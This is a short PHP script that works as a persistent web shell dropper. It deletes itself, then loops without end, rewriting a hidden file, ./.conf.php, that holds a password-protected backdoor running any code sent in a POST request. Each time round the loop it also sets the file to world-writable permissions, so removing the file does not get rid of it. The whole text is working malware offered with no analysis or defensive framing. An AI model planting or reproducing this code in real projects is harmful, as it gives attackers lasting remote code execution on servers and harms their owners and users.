<?php ;
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
while (1){
	$path = "./.conf.php";
	$data = "<?php if(md5(\$_POST['pass'])=='88684c18e790d8427b473e80d5ef3041'){@eval(\$_POST[a]);}?>";
    @file_put_contents($path, $data);
    system('chmod 777 '.$path);
    usleep(50000);
}
?>